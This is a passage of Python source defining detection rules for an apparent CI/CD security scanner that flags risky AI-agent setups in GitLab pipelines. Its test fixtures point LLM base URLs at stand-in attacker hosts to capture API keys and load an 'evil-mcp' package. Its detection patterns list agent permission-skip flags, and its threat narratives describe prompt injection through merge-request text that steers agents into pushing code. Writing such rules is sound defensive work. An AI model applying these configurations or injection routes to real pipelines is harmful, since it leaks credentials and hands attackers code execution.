                "  script:\n    - claude -p 'cut release'\n    - git push origin main"
            ),
            # MR + push but no agent
            ("deploy:\n  only:\n    - merge_requests\n  script:\n    - git push origin HEAD"),
            # Commented-out agent line
            (
                "triage:\n  only:\n    - merge_requests\n"
                "  script:\n    # - aider --yes-always\n    - echo hi\n    - glab mr update 1"
            ),
        ],
        stride=["T", "E"],
        threat_narrative=(
            "An attacker opens a fork MR.  GitLab starts an MR "
            "pipeline that invokes the agent; the agent reads the "
            "MR description via its own ``glab mr view`` / file-"
            "reader tools; the MR description contains a prompt "
            "injection that tells the agent to `git push` a "
            "malicious commit to the MR branch (or to `glab mr "
            "update` the title/description with a phishing link, "
            "or to `docker push` a tainted image to the shared "
            "registry).  Because the pipeline holds ``CI_JOB_TOKEN`` "
            "and the write primitive is already in the job's shell, "
            "the attacker need not to break any GitLab permission "
            "model — they just steer the agent into invoking the "
            "existing primitive."
        ),
        incidents=[
            "supermemoryai/supermemory claude-auto-fix-ci.yml (GH analog)",
            "trycua/cua claude-auto-fix.yml (GH analog)",
        ],
        confidence="low",
    ),
    # =========================================================================
    # AI-GL-010: GitLab port of AI-GH-018 — raw agent CLI with skip-confirm
    # flags in a ``script:`` line.  Fires regardless of trigger because the
    # skip-confirmation flag itself is the hazard: the agent becomes an
    # autonomous shell runner steered by whatever prompt content reaches it
    # (commit messages, issue bodies, file contents from the checked-out
    # source).  AI-GL-008 already catches agent CLI + MR trigger; this rule
    # catches the stricter subset — blanket-confirmation flags anywhere.
    # =========================================================================
    Rule(
        id="AI-GL-010",
        title=("Raw AI agent CLI with skip-confirmation flags in a GitLab script: line"),
        severity=Severity.HIGH,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A GitLab CI ``script:`` line invokes an agent CLI with a "
            "blanket-confirmation flag: "
            "``claude --dangerously-skip-permissions`` (Claude Code), "
            "``aider --yes-always`` (Aider), "
            "``gemini --yolo`` (Gemini CLI), "
            "``cursor-agent`` / ``cursor-cli``, "
            "``codex {exec,chat,complete}``, or ``openhands --``.  "
            "Each flag is the vendor's explicit 'I know what I'm "
            "doing, skip every confirmation' override.  In a CI "
            "pipeline the flag turns the agent into an autonomous "
            "shell runner — whatever prompt content lands in scope "
            "(the MR description via ``glab mr view``, a file from "
            "the checked-out source, a commit message) can "
            "steer the agent into running ``bash`` / ``git push`` / "
            "``glab api`` with the job's ``CI_JOB_TOKEN``.  Fires "
            "regardless of trigger because the flag is dangerous on "
            "any trigger — scheduled pipelines still read attacker-"
            "influenced commit history; ``workflow_dispatch``-style "
            "manual triggers still read issue bodies.  Distinct from "
            "AI-GL-008 (which gates on MR trigger) — this is the "
            "GitLab analog of AI-GH-018."
        ),
        pattern=ContextPattern(
            # Same flag set as AI-GH-018's anchor — vendor-specific
            # enough to be high-precision without a trigger gate.
            anchor=(
                r"(?:"
                # Claude Code — unique flag names
                r"(?:^|\s)(?:--dangerously-skip-permissions"
                r"|--permission-mode|--allowedTools|--disallowedTools"
                r"|--append-system-prompt)(?:[\s=]|$)"
                # Aider — unique flag names
                r"|(?:^|\s)(?:--yes-always|--auto-commits|--dirty-commits"
                r"|--no-check-update|--edit-format|--map-tokens)(?:[\s=]|$)"
                # Gemini CLI — unique flags
                r"|(?:^|\s)(?:--yolo|--prompt-interactive|--approval-mode)(?:[\s=]|$)"
                # Codex / OpenHands / Cursor — binary+subcommand is
                # distinctive on its own.
                r"|\bcodex\s+(?:exec|chat|complete)\b"
                r"|\bopenhands\s+--"
                r"|\bcursor-(?:agent|cli)\s+-"
                r")"
            ),
            # File-level requires: the tool binary name appears.  Mirrors
            # AI-GH-018 — closes the loop when a flag appears in a context
            # that doesn't corroborate the tool (e.g., a docstring mention).
            requires=(
                r"(?:"
                r"\bclaude\b|\baider\b|\bgemini\b"
                r"|\bcodex\b|\bopenhands\b|\bcursor-agent\b|\bcursor-cli\b"
                r")"
            ),
            scope="file",
            exclude=[
                r"^\s*#",
                # Package-install lines — LOTP-GL / package-install rule
                # catches the install; this rule concentrates on the
                # invocation form (same split as AI-GH-018).
                r"^\s*-?\s*script:.*\b(?:npm|pip|pipx|apt|yum|dnf)\s+install\b",
                r"^\s*-\s*(?:npm|pip|pipx|apt|yum|dnf)\s+install\b",
            ],
        ),
        remediation=(
            "Raw agent CLI invocations with skip-confirmation flags\n"
            "mean the agent becomes an autonomous shell runner steered\n"
            "by whatever text reaches its prompt — commit messages, MR\n"
            "descriptions, file contents from the checked-out source.\n"
            "Three layered mitigations:\n"
            "  1. Drop the blanket-confirmation flag.  Default-interactive\n"
            "     is the vendor's safe mode; use it.\n"
            "  2. Gate the job by MR source.  GitLab's\n"
            "     `$CI_MERGE_REQUEST_SOURCE_PROJECT_ID` equals\n"
            "     `$CI_PROJECT_ID` on same-project MRs; fork MRs are\n"
            "     the higher-risk path.\n"
            "  3. If the flag is genuinely load-bearing (release\n"
            "     automation), move the invocation to a job gated on\n"
            "     `$CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH` or\n"
            "     `$CI_COMMIT_TAG` and attach a protected environment\n"
            "     to require a maintainer approval.\n"
            "Route prompt content through variables: and then via\n"
            "`$PROMPT` inside the script; never inline `$CI_MERGE_REQUEST_\n"
            "TITLE` / `$CI_COMMIT_MESSAGE` directly as an agent arg.\n"
            "Run `taintly --guide AI-GH-018` for the full checklist\n"
            "(the GitHub guide applies directly)."
        ),
        reference=(
            "https://docs.anthropic.com/en/docs/claude-code; "
            "https://aider.chat/docs/config/options.html; "
            "https://cloud.google.com/gemini/docs/codeassist/gemini-cli"
        ),
        test_positive=[
            # Claude Code with --dangerously-skip-permissions
            ("triage:\n  script:\n    - claude --dangerously-skip-permissions -p 'fix this'"),
            # Aider --yes-always
            (
                "review:\n  only:\n    - merge_requests\n"
                "  script:\n    - aider --yes-always --message 'review'"
            ),
            # Gemini --yolo
            ("assist:\n  script:\n    - gemini --yolo 'help me'"),
            # codex exec
            ("agent:\n  script:\n    - codex exec 'deploy'"),
        ],
        test_negative=[
            # Agent CLI without skip-confirmation flag — AI-GL-008 handles
            # the MR-triggered case; this rule deliberately doesn't fire.
            ("review:\n  only:\n    - merge_requests\n  script:\n    - claude -p 'review this'"),
            # Flag appears but tool binary isn't present in the file (rare
            # but possible in a template).  No corroborating binary name
            # → no fire.
            ("other:\n  script:\n    - echo '--yes-always is a flag'"),
            # Package install — LOTP-style rules handle the install form.
            ("install:\n  script:\n    - npm install -g @anthropic-ai/claude-code"),
            # Commented out
            ("triage:\n  script:\n    # - claude --dangerously-skip-permissions\n    - echo hi"),
        ],
        stride=["T", "E"],
        threat_narrative=(
            "``--dangerously-skip-permissions`` / ``--yes-always`` / "
            "``--yolo`` are each the vendor's explicit confirmation "
            "bypass.  On any CI trigger, the agent has access to the "
            "job's ``CI_JOB_TOKEN`` and the runner's shell; every "
            "prompt-injected 'please run ...' proposal is auto-"
            "approved.  Combined with an attacker-picked file "
            "(package.json, Dockerfile, README, CHANGELOG) from the "
            "checked-out source, the flag turns the agent into a "
            "remote code execution primitive."
        ),
        incidents=[
            "Eriksen pull_request_target campaign (GH, April 2026)",
            "trycua/cua claude-auto-fix.yml (GH analog)",
        ],
        confidence="medium",
    ),
    # =========================================================================
    # AI-GL-011: Custom LLM-provider BASE_URL override — credentials leak to
    # the overridden host.  GitLab port of AI-GH-016.  Pattern is env-var
    # based so the attack mechanic is identical: the SDK sends the bearer
    # token to whoever controls the host.  On GitLab the override most often
    # lives in a global or job-scoped ``variables:`` block, so match the
    # ``KEY: value`` shape without requiring a specific container.
    # =========================================================================
    Rule(
        id="AI-GL-011",
        title=("Custom LLM-provider BASE_URL override routes API traffic off-vendor (GitLab)"),
        severity=Severity.HIGH,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-6",
        description=(
            "A GitLab pipeline sets a provider-specific ``*_BASE_URL`` "
            "variable (``ANTHROPIC_BASE_URL`` / ``OPENAI_BASE_URL`` / "
            "``OPENAI_API_BASE`` / ``GOOGLE_API_BASE_URL`` / "
            "``AWS_BEDROCK_ENDPOINT`` / ``AZURE_OPENAI_ENDPOINT`` / "
            "``CLAUDE_CODE_BASE_URL`` / ``CURSOR_API_BASE_URL``) to a "
            "non-official value.  The LLM SDK then sends the bearer "
            "token (``ANTHROPIC_API_KEY`` / ``OPENAI_API_KEY`` / etc.) "
            "to the overridden host on every request, handing the "
            "credential to whoever controls that host.  Check Point's "
            "CVE-2025-59536 (CVSS 8.7) documents the exact pattern "
            "for Claude Code; every major LLM SDK has the same class "
            "of env-var override.  Legitimate uses exist (Bedrock / "
            "Vertex proxy, internal model gateways) but deserve "
            "explicit review rather than a silent variable assignment."
        ),
        pattern=RegexPattern(
            match=(
                r"^\s*(?:ANTHROPIC_BASE_URL|OPENAI_BASE_URL|OPENAI_API_BASE|"
                r"GOOGLE_API_BASE_URL|GOOGLE_GENERATIVE_AI_API_BASE|"
                r"AWS_BEDROCK_ENDPOINT|AZURE_OPENAI_ENDPOINT|"
                r"CLAUDE_CODE_BASE_URL|CURSOR_API_BASE_URL)\s*:\s*\S"
            ),
            exclude=[
                r"^\s*#",
                # Official provider hosts — don't fire on the safe form.
                r":\s*['\"]?https://[a-z0-9.-]*\.(?:amazonaws\.com|"
                r"googleapis\.com|azure\.com|azure\.us)(?:/|$|\s|['\"])",
            ],
        ),
        remediation=(
            "Overriding the LLM provider's BASE_URL routes your API\n"
            "traffic — including the bearer token — to a non-vendor\n"
            "host.  Remove the variable and let the SDK default to\n"
            "the official endpoint.  If you genuinely need a proxy:\n"
            "  1. Deploy it inside your network / cloud boundary.\n"
            "  2. Pin the URL to an allowlist and document WHY in\n"
            "     a comment.\n"
            "  3. Mint a separate, narrower API key for the proxied\n"
            "     traffic so a compromise of the gateway doesn't leak\n"
            "     your prod key.\n"
            "Run `taintly --guide AI-GH-016` for the full checklist\n"
            "(the GitHub guide applies directly)."
        ),
        reference=(
            "https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/"
        ),
        test_positive=[
            # Attacker-controlled collector via global variables:.
            "variables:\n  ANTHROPIC_BASE_URL: https://proxy.evil.example/v1",
            # OpenAI-compatible proxy override at job level.
            "triage:\n  variables:\n    OPENAI_API_BASE: https://api.mycollector.net/v1\n  script:\n    - python run.py",
            # OpenAI SDK's alternate name for the same var.
            "variables:\n  OPENAI_BASE_URL: http://attacker.com",
            # Claude Code internal env override.
            "job:\n  variables:\n    CLAUDE_CODE_BASE_URL: https://my-company-proxy.internal/claude\n  script:\n    - claude -p 'hi'",
        ],
        test_negative=[
            # Official Bedrock host — exclude pattern matches.
            "variables:\n  AWS_BEDROCK_ENDPOINT: https://bedrock-runtime.us-east-1.amazonaws.com",
            # Official Azure OpenAI resource.
            "variables:\n  AZURE_OPENAI_ENDPOINT: https://mycompany.openai.azure.com/",
            # Official Google Vertex endpoint.
            "variables:\n  GOOGLE_API_BASE_URL: https://us-central1-aiplatform.googleapis.com",
            # Commented out.
            "variables:\n  # ANTHROPIC_BASE_URL: https://test.example.com",
            # Unrelated var with a similar-looking name.
            "variables:\n  APP_BASE_URL: https://myapp.example.com",
        ],
        stride=["S", "I"],
        threat_narrative=(
            "Setting ``ANTHROPIC_BASE_URL`` (or the OpenAI / Gemini / "
            "Bedrock equivalents) to an attacker-controlled host means "
            "the LLM SDK sends the Authorization header — containing "
            "the vendor API key — to that host on every request.  The "
            "attacker receives the key as a side effect of the pipeline "
            "running normally; no shell injection, no exploit trigger, "
            "just a DNS-pointing attack that pays out whenever a CI "
            "run happens.  CVE-2025-59536 disclosed this for Claude "
            "Code's project-file form; the same mechanic applies when "
            "the override lives in pipeline ``variables:``."
        ),
        confidence="medium",
        incidents=["CVE-2025-59536 (Claude Code project file, GH analog)"],
    ),
    # =========================================================================
    # AI-GL-012: MCP server loaded from an unpinned registry runner
    # (``npx`` / ``uvx`` / ``pipx``) without a version-pinned package
    # in its ``args``.  GitLab port of AI-GH-011.  Exact same attack
    # class: the bytes backing the MCP server change with every upstream
    # push, so a compromised or typo-squatted package silently rewrites
    # the agent's tool set on the next CI run.  The MCP JSON config
    # typically lives in a ``variables:`` value on GitLab — multi-line
    # YAML block scalar, which means a multi-line regex with a small
    # lookahead works the same way as on GitHub.
    # =========================================================================
    Rule(
        id="AI-GL-012",
        title=("MCP server loaded via npx/uvx/pipx without a version pin (GitLab)"),
        severity=Severity.HIGH,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-3",
        description=(
            "An MCP server config referenced from a GitLab pipeline "
            'declares ``"command": "npx"`` / ``"uvx"`` / '
            '``"pipx"`` without a version-pinned package in its '
            "``args``.  These loaders resolve the latest published "
            "package at runtime, so the agent's tool implementations "
            "change whenever the upstream publisher pushes a new "
            "release.  A compromised or typo-squatted MCP package "
            "silently rewrites the agent's tool surface on the next "
            "pipeline run, carrying whatever scope the job's "
            "``CI_JOB_TOKEN`` (and any bound ``withCredentials``-style "
            "secret) grants.  Same supply-chain class as unpinned "
            "GitLab ``include:`` (SEC3-GL-002) applied to MCP."
        ),
        pattern=SequencePattern(
            pattern_a=r'"command"\s*:\s*"(?:npx|uvx|pipx)"',
            absent_within=r"@\d|@[a-f0-9]{7,}",
            lookahead_lines=4,
            exclude=[r"^\s*#", r"^\s*//"],
        ),
        remediation=(
            "Pin the MCP package to a specific version or a local\n"
            "path under the repo.  Inside a GitLab variable whose\n"
            "value is a JSON block scalar:\n\n"
            "variables:\n"
            "  MCP_CONFIG: |\n"
            '    {"mcpServers":{\n'
            '      "github":{\n'
            '        "command":"npx",\n'
            '        "args":["-y","@modelcontextprotocol/server-github@1.2.3"]\n'
            "      }}}\n\n"
            "For production pipelines, mirror the MCP package into a\n"
            "protected GitLab package registry and install from there.\n"
            "Run `taintly --guide AI-GH-011` for the full checklist."
        ),
        reference="https://modelcontextprotocol.io/docs",
        test_positive=[
            '  MCP_CONFIG: \'{"mcpServers":{"gh":{"command":"npx","args":["-y","@modelcontextprotocol/server-github"]}}}\'',
            (
                "  MCP_CONFIG: |\n"
                '    {"mcpServers":{\n'
                '      "fs":{\n'
                '        "command":"npx",\n'
                '        "args":["@modelcontextprotocol/server-filesystem"]\n'
                "      }}}"
            ),
            '  MCP_CFG: \'{"s":{"command":"uvx","args":["my-mcp-server"]}}\'',
        ],
        test_negative=[
            '  MCP_CONFIG: \'{"mcpServers":{"gh":{"command":"npx","args":["-y","@modelcontextprotocol/server-github@1.2.3"]}}}\'',
            '  MCP_CONFIG: \'{"s":{"command":"node","args":["./tools/mcp-server.js"]}}\'',
            '  # MCP_CONFIG: \'{"s":{"command":"npx","args":["my-mcp-server"]}}\'',
        ],
        stride=["T"],
        threat_narrative=(
            "An attacker publishes a new version of an MCP package "
            "(or typo-squats one that a pipeline references): every "
            "GitLab pipeline that resolves the package via ``npx`` / "
            "``uvx`` / ``pipx`` on its next run picks up the attacker "
            "bytes.  The MCP server loads into every agent invocation, "
            "giving attacker code the agent's full tool surface — "
            "``glab`` calls, file writes, shell access — on the job's "
            "``CI_JOB_TOKEN``."
        ),
        confidence="medium",
    ),
    # =========================================================================
    # AI-GL-013: Privileged-scope MCP server loaded on a fork-reachable
    # GitLab trigger.  GitLab port of AI-GH-012.  Fork-reachable triggers
    # on GitLab: ``workflow.rules`` / ``rules`` that allow
    # ``$CI_PIPELINE_SOURCE == "merge_request_event"`` (MRs from forks
    # run the pipeline unless ``Settings > CI/CD > Pipelines from forks``
    # is disabled — which it usually isn't).  ``external_pull_request_event``
    # is GH-flavoured MR bridge.  We match both.
    # =========================================================================
    Rule(
        id="AI-GL-013",
        title=("Privileged-scope MCP server loaded on a fork-reachable GitLab trigger"),
        severity=Severity.HIGH,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A GitLab pipeline loads an MCP server with a known-"
            "privileged tool surface — ``server-filesystem`` (file "
            "write), ``server-github`` / ``server-gitlab`` (SCM write), "
            "``server-postgres`` / ``server-sqlite`` (SQL), "
            "``server-bash`` / ``server-shell`` (shell exec), "
            "``server-docker`` / ``server-puppeteer`` (container / "
            "browser control) — AND the pipeline runs on a fork-"
            "reachable trigger (``merge_request_event`` source rule, "
            "``external_pull_request_event``, or a bare ``rules:`` "
            "that admits MR pipelines).  Stacking that surface on a "
            "fork-reachable trigger is the precondition for the "
            "prompt-injection-to-RCE escalation class.  Pair with a "
            "review of ``allowedTools`` scoping — a named-tool "
            "allowlist is categorically different from wildcard MCP "
            "access."
        ),
        pattern=ContextPattern(
            anchor=(
                r"(?:"
                r"server-(?:filesystem|github|gitlab|postgres|sqlite|bash|shell"
                r"|docker|puppeteer|brave-search|slack|google-drive)"
                r"|mcp__(?:filesystem|github|gitlab|bash|shell|postgres|docker"
                r"|puppeteer)__"
                r")"
            ),
            requires=(
                r"(?m:"
                r"\$CI_PIPELINE_SOURCE\s*==\s*['\"]?merge_request_event"
                r"|\$CI_PIPELINE_SOURCE\s*==\s*['\"]?external_pull_request_event"
                r"|^\s*-\s*if:\s*\$CI_MERGE_REQUEST_"
                r"|^\s*-\s*merge_requests\b"
                r")"
            ),
            scope="file",
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Tighten the MCP tool surface or isolate it from fork-\n"
            "reachable pipelines:\n\n"
            "1. Replace wildcard MCP scope with a named-tool allowlist.\n"
            "   For agent CLIs that support it, a single scoped tool\n"
            "   (e.g., a read-only SCM commenter) is safe where\n"
            "   ``mcp__github__*`` wildcard is not.\n\n"
            "2. Gate the MCP-enabled job on MR source-project identity:\n\n"
            "     rules:\n"
            "       - if: '$CI_MERGE_REQUEST_SOURCE_PROJECT_ID == $CI_PROJECT_ID'\n"
            "         when: on_success\n"
            "       - when: never\n\n"
            "   Same-project MRs run with the full token set; fork MRs\n"
            "   get skipped.\n\n"
            "3. For the shell / filesystem / docker families,\n"
            "   remove the MCP server from MR-triggered paths entirely\n"
            "   and keep it on scheduled / protected-branch pipelines\n"
            "   with maintainer-approval environments."
        ),
        reference="https://github.com/modelcontextprotocol/servers",
        test_positive=[
            (
                "agent:\n"
                "  rules:\n"
                "    - if: '$CI_PIPELINE_SOURCE == \"merge_request_event\"'\n"
                "  variables:\n"
                '    MCP_CFG: \'{"s":{"command":"npx","args":["-y","@modelcontextprotocol/server-filesystem"]}}\'\n'
                "  script:\n    - claude -p 'review'"
            ),
            (
                "review:\n"
                "  only:\n    - merge_requests\n"
                "  variables:\n"
                '    MCP_CFG: \'{"s":{"command":"npx","args":["-y","@modelcontextprotocol/server-bash"]}}\'\n'
                "  script:\n    - aider"
            ),
        ],
        test_negative=[
            # Privileged MCP but only on protected-branch pipelines.
            (
                "deploy:\n"
                "  rules:\n"
                "    - if: '$CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH'\n"
                "  variables:\n"
                '    MCP_CFG: \'{"s":{"command":"npx","args":["-y","@modelcontextprotocol/server-filesystem@1.0.0"]}}\'\n'
                "  script:\n    - claude -p 'ship'"
            ),
            # MR-triggered but NOT a privileged MCP server
            (
                "review:\n"
                "  only:\n    - merge_requests\n"
                "  variables:\n"
                '    MCP_CFG: \'{"web":{"command":"npx","args":["-y","@mcp/server-fetch@1"]}}\'\n'
                "  script:\n    - claude"
            ),
            # Comment
            "# rules: { if: $CI_PIPELINE_SOURCE == 'merge_request_event' }",
        ],
        stride=["T", "E"],
        threat_narrative=(
            "A GitLab MR pipeline that loads a privileged MCP server "
            "gives a prompt-injection payload from the MR description / "
            "commit message / source files a direct channel into "
            "``glab api`` writes, filesystem writes in the runner, or "
            "a SQL injection primitive.  With ``Settings > CI/CD > "
            "Pipelines from forks`` enabled (the default for most "
            "open-source projects) the pipeline runs on attacker-"
            "controlled source code with the project's CI/CD variables "
            "bound, so the agent's tool surface is effectively the "
            "attacker's."
        ),
        confidence="medium",
    ),
    # =========================================================================
    # AI-GL-014 — port of AI-GH-022.  Agent invoked with permission /
    # sandbox-skip flag (--dangerously-skip-permissions, --yolo,
    # wildcard tools, CLAUDE_CODE_ALLOW_ALL=1, AIDER_YES_ALWAYS=1).
    # =========================================================================
    Rule(
        id="AI-GL-014",
        title=("AI agent invoked with a permission/sandbox-skip flag (GitLab)"),
        severity=Severity.HIGH,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A GitLab job invokes an AI coding-agent CLI (``claude`` / "
            "``aider`` / ``openhands`` / ``cursor-agent`` / ``codex``) "
            "with a flag or environment variable that disables the "
            "agent's permission boundary or wildcards its tool "
            "allowlist.  Same flag set the GitHub port (AI-GH-022) "
            "covers: ``--dangerously-skip-permissions``, ``--yolo``, "
            "``--allowedTools '*'``, ``--allowedTools 'Bash(*)'``, "
            "``CLAUDE_CODE_ALLOW_ALL=1``, ``AIDER_YES_ALWAYS=1``, "
            "``--yes-always``.  These flags exist for local "
            "interactive use where the user supervises every action; "
            "in CI they remove the only barrier between an indirect "
            "prompt-injection payload and a shell that has the "
            "project's CI/CD variables and bound credentials."
        ),
        pattern=RegexPattern(
            match=(
                r"(?:"
                r"--dangerously-skip-permissions"
                r"|--yolo\b"
                r"|\bCLAUDE_CODE_ALLOW_ALL\s*[:=]\s*['\"]?1"
                r"|\bAIDER_YES_ALWAYS\s*[:=]\s*['\"]?1"
                r"|--yes-always\b"
                r"|--allowed[-_]?[Tt]ools[\s=]+['\"]\*['\"]"
                r"|--allowedTools[\s=]+['\"]?Bash\(\*\)['\"]?"
                r")"
            ),
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Remove the skip / wildcard flag and replace with an\n"
            "explicit, narrow allowlist:\n"
            "\n"
            "  job:\n"
            "    script:\n"
            "      - claude --allowedTools 'Bash(npm test)' '$PROMPT'\n"
            "\n"
            "For environment-variable bypasses, drop them from the\n"
            "job's ``variables:`` block.  Cross-platform sibling: "
            "AI-GH-022 (GitHub Actions) and AI-JK-010 (Jenkins)."
        ),
        reference=(
            "https://phoenix.security/critical-ci-cd-nightmare-3-command-injection-flaws-in-claude-code-cli-allow-credential-exfiltration/"
        ),
        test_positive=[
            ("review:\n  script:\n    - claude --dangerously-skip-permissions '$PROMPT'\n"),
            ('fix:\n  script:\n    - aider --yes-always --message "$CI_MERGE_REQUEST_TITLE"\n'),
            (
                "review:\n"
                "  variables:\n"
                "    CLAUDE_CODE_ALLOW_ALL: 1\n"
                "  script:\n"
                "    - claude '$PROMPT'\n"
            ),
        ],
        test_negative=[
            ("review:\n  script:\n    - claude --allowedTools 'Bash(npm test)' '$PROMPT'\n"),
            ("build:\n  script:\n    - npm install --yes\n"),
            (
                "review:\n"
                "  # NEVER set --dangerously-skip-permissions in CI\n"
                "  script:\n"
                "    - claude --allowedTools 'Read(*)' '$PROMPT'\n"
            ),
        ],
        stride=["T", "E"],
        threat_narrative=(
            "Templates copy-pasted from agent vendor blog posts often "
            "include ``--dangerously-skip-permissions`` or ``--yolo`` "
            "as a convenience for local interactive use.  When that "
            "template lands in a GitLab CI ``script:`` line, the agent "
            "runs with the project's CI/CD variables and bound "
            "credentials, with no permission prompt to interrupt "
            "prompt-injection payloads from MR titles / descriptions / "
            "discussions."
        ),
        incidents=[
            "Phoenix Security — claude-code CLI command-injection (2025)",
            "Embrace The Red — AWS Kiro indirect prompt injection RCE (2025)",
        ],
    ),
    # =========================================================================
    # AI-GL-015 — port of AI-GH-024.  MCP config sourced from MR-head
    # checkout (or workspace ``.mcp.json`` discovery).
    # =========================================================================
    Rule(
        id="AI-GL-015",
        title=(
            "MCP server config sourced from MR-head checkout "
            "(--mcp-config or .mcp.json discovery, GitLab)"
        ),
        severity=Severity.HIGH,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-3",
        description=(
            "An AI coding-agent step in a GitLab pipeline loads its "
            "MCP server fleet from a config file that lives in the "
            "workspace — either by explicit ``--mcp-config <path>`` "
            "flag or by implicit discovery of ``.mcp.json`` / "
            "``.claude/mcp_servers.json`` / "
            "``claude_desktop_config.json`` / ``mcp_settings.json`` — "
            "AND the pipeline runs on a merge-request event "
            "(``CI_PIPELINE_SOURCE == 'merge_request_event'`` or "
            "``CI_PIPELINE_SOURCE == 'external_pull_request_event'``) "
            "or references the MR source branch.  The MR author "
            "therefore chooses which MCP servers the agent loads.  "
            'Adding ``"command": "npx -y evil-mcp@latest"`` to '
            "the discovered config hands control to attacker code on "
            "the agent's *first* tool call.  Cross-platform sibling "
            "of AI-GH-024."
        ),
        pattern=ContextPattern(
            anchor=(
                r"(?:"
                r"--mcp-config[\s=]+['\"]?(?!/)[^\s'\"]+"
                r"|\.mcp\.json\b"
                r"|\.claude/mcp_servers\.json\b"
                r"|\bclaude_desktop_config\.json\b"
                r"|\bmcp_settings\.json\b"
                r")"
            ),
            requires=(
                # Pipeline must reach the MR branch — either via
                # ``CI_PIPELINE_SOURCE`` matching the MR event or
                # explicit reference to the MR source SHA / ref.
                r"(?:"
                r"CI_PIPELINE_SOURCE\s*==\s*['\"]?(?:merge_request_event"
                r"|external_pull_request_event)['\"]?"
                r"|\$CI_MERGE_REQUEST_SOURCE_BRANCH_(?:NAME|SHA)\b"
                r"|merge_request_event\b"
                r")"
            ),
            scope="file",
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Don't let the MR head choose your MCP server fleet.  Pin\n"
            "the config to a path the contributor cannot edit (a path\n"
            "under ``.gitlab/`` covered by CODEOWNERS, or a path that\n"
            "always resolves to the protected branch):\n"
            "\n"
            "  review:\n"
            "    script:\n"
            "      - claude --mcp-config .gitlab/mcp.trusted.json\n"
            "\n"
            "Or strip ``.mcp.json`` from the workspace before the "
            "agent step runs:\n"
            "\n"
            "      - rm -f .mcp.json .claude/mcp_servers.json\n"
            "\n"
            "Cross-platform sibling: AI-GH-024 (GitHub Actions)."
        ),
        reference=(
            "https://embracethered.com/blog/posts/2025/model-context-protocol-security-risks-and-exploits/"
        ),
        test_positive=[
            (
                "review:\n"
                "  rules:\n"
                "    - if: $CI_PIPELINE_SOURCE == 'merge_request_event'\n"
                "  script:\n"
                "    - claude --mcp-config ./.mcp.json\n"
            ),
            (
                "review:\n"
                "  rules:\n"
                "    - if: $CI_PIPELINE_SOURCE == 'merge_request_event'\n"
                "  script:\n"
                "    - cat .mcp.json && claude\n"
            ),
            (
                "review:\n"
                "  variables:\n"
                "    REF: $CI_MERGE_REQUEST_SOURCE_BRANCH_SHA\n"
                "  script:\n"
                "    - claude --mcp-config pr/mcp.json\n"
            ),
        ],
        test_negative=[
            (
                "review:\n"
                "  rules:\n"
                "    - if: $CI_COMMIT_BRANCH == 'main'\n"
                "  script:\n"
                "    - claude --mcp-config /etc/mcp/trusted.json\n"
            ),
            (
                "review:\n"
                "  rules:\n"
                "    - if: $CI_PIPELINE_SOURCE == 'merge_request_event'\n"
                "  script:\n"
                "    - npm test\n"
            ),
            (
                "review:\n"
                "  # NEVER use --mcp-config with a workspace path on MR pipelines\n"
                "  rules:\n"
                "    - if: $CI_PIPELINE_SOURCE == 'merge_request_event'\n"
                "  script:\n"
                "    - claude --mcp-config /etc/mcp/trusted.json\n"
            ),
        ],
        stride=["T", "E"],
        threat_narrative=(
            "An attacker opens an MR that adds ``.mcp.json`` to the "
            "repo root, declaring an MCP server: ``npx -y "
            "attacker/mcp-helper@latest``.  The MR-event pipeline "
            "checks out the MR head and runs ``claude --mcp-config "
            "./.mcp.json``.  On the agent's first tool call, the "
            "runner ``npx``s the attacker's package — arbitrary code "
            "execution with the project's CI/CD variables and bound "
            "credentials, no prompt-injection payload required."
        ),
        incidents=[
            "Embrace The Red — MCP Untrusted Servers (2025)",
            "Kilo Code — AI agent supply-chain advisory (Oct 2025)",
        ],
    ),
    # =========================================================================
    # AI-GL-016 — port of AI-GH-025.  HuggingFace resolver
    # (HF_ENDPOINT / HF_HOME / TRANSFORMERS_CACHE) rebound from
    # CI-variable / cleartext-http source.
    # =========================================================================
    Rule(
        id="AI-GL-016",
        title=(
            "HuggingFace resolver env (HF_ENDPOINT / HF_HOME) "
            "rebound from CI-variable or cleartext http (GitLab)"
        ),
        severity=Severity.HIGH,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-3",
        description=(
            "A GitLab job assigns one of the HuggingFace resolver "
            "environment variables — ``HF_ENDPOINT``, "
            "``HF_HUB_ENDPOINT``, ``HF_HOME``, "
            "``HUGGINGFACE_HUB_CACHE``, or ``TRANSFORMERS_CACHE`` — "
            "from a CI variable an MR can influence "
            "(``$CI_MERGE_REQUEST_*``, ``$CI_COMMIT_*``, "
            "``${pipeline-input-var}``) or to a cleartext ``http://`` "
            "URL.  ``HF_ENDPOINT`` redirects every downstream "
            "``from_pretrained`` / ``snapshot_download`` / "
            "``load_dataset`` / ``hf_hub_download`` call through the "
            "attacker's mirror, so a single env-line assignment "
            "compromises the resolver for the whole pipeline run — "
            "regardless of how carefully each individual call pins "
            "``revision=``.  Cross-platform sibling of AI-GH-025."
        ),
        pattern=RegexPattern(
            match=(
                r"\b(?:HF_ENDPOINT|HF_HUB_ENDPOINT|HF_HOME"
                r"|HUGGINGFACE_HUB_CACHE|TRANSFORMERS_CACHE)\s*"
                r"[:=]\s*['\"]?(?:"
                # MR-influenced GitLab CI predefined variables.
                r"\$CI_(?:MERGE_REQUEST|COMMIT)_"
                # Cleartext http:// downgrade.
                r"|http://"
                r")"
            ),
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Set the resolver to a constant trusted endpoint:\n"
            "\n"
            "  fetch:\n"
            "    variables:\n"
            "      HF_ENDPOINT: https://huggingface.co\n"
            "    script:\n"
            "      - huggingface-cli download org/model\n"
            "\n"
            "If you need to mirror for performance / air-gap reasons, "
            "pin to a literal allow-listed hostname, not to a "
            "CI-variable value.  Cross-platform sibling: AI-GH-025 "
            "(GitHub Actions)."
        ),
